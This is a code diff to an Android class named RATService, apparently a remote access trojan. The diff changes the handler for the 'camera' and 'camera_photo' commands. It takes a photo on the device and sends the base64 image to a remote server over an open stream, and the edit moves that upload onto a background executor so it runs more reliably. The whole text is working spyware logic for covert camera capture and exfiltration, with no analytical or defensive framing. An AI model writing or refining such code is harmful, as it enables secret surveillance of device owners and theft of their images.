@@ -554,44 +554,45 @@ public class RATService extends Service {
                 break;
                 
             // CAMERA COMMANDS - FIXED: Removed duplicate case
-      case "camera":
+    case "camera":
 case "camera_photo":
     if (cameraModule != null) {
         Log.d(TAG, "📸 Taking photo with camera module");
         
-        // First test if camera is accessible
-        cameraModule.testCameraAccess();
-        
         cameraModule.takePhoto(new CameraModule.CameraCallback() {
             @Override
             public void onPhotoTaken(String base64Image) {
-                Log.d(TAG, "📸 Photo taken successfully, sending response, length: " + base64Image.length());
+                Log.d(TAG, "📸 Photo taken successfully, sending response");
                 
-                // Force send without chunking
-                if (out != null) {
+                // Use executor to send response (not on main thread)
+                executor.execute(() -> {
                     try {
-                        out.println(base64Image);
-                        out.flush();
-                        Log.d(TAG, "📸 Camera response sent to server");
+                        if (out != null) {
+                            out.println(base64Image);
+                            out.flush();
+                            Log.d(TAG, "📸 Camera response sent to server");
+                        }
                     } catch (Exception e) {
                         Log.e(TAG, "Error sending camera response", e);
                     }
-                } else {
-                    Log.e(TAG, "❌ Output stream is null, cannot send response");
-                }
+                });
             }
             
             @Override
             public void onError(String error) {
                 Log.e(TAG, "📸 Camera error: " + error);
-                if (out != null) {
+                
+                // Use executor to send error (not on main thread)
+                executor.execute(() -> {
                     try {
-                        out.println(error);
-                        out.flush();
+                        if (out != null) {
+                            out.println(error);
+                            out.flush();
+                        }
                     } catch (Exception e) {
                         Log.e(TAG, "Error sending error", e);
                     }
-                }
+                });
             }
         });
     } else {
